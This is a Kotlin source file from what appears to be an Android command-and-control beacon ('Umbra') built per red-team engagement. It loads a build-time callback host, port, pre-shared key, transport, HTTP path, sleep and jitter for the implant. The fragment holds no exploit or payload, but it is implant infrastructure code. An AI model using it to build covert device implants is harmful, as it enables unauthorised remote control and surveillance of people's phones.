package io.umbra.beacon

/**
 * Bridges Gradle's generated BuildConfig into the beacon.
 *
 * Every value comes from an environment variable at build time (see
 * app/build.gradle), so one APK per engagement -- nothing is fetched at runtime.
 */
object RemoteConfig {
    fun load(context: android.content.Context? = null): BeaconConfig? {
        val pskHex = BuildConfig.UMBRA_PSK_HEX
        if (pskHex.isBlank()) return null
        val psk = try {
            Crypto.unhex(pskHex)
        } catch (t: Throwable) {
            return null
        }
        if (psk.size < 16) return null

        val agentId = BuildConfig.UMBRA_AGENT_ID.ifBlank {
            "android-" + Crypto.hex(Crypto.random(4))
        }
        return BeaconConfig(
            host = BuildConfig.UMBRA_HOST,
            port = BuildConfig.UMBRA_PORT,
            psk = psk,
            agentId = agentId,
            transport = BuildConfig.UMBRA_TRANSPORT,
            httpBaseUrl = BuildConfig.UMBRA_HTTP_BASE,
            httpPath = BuildConfig.UMBRA_HTTP_PATH,
            sleepSec = BuildConfig.UMBRA_SLEEP,
            jitterPercent = BuildConfig.UMBRA_JITTER,
            version = BuildConfig.VERSION_NAME,
            androidContext = context,
            stateDir = context?.filesDir?.absolutePath ?: "",
        )
    }
}
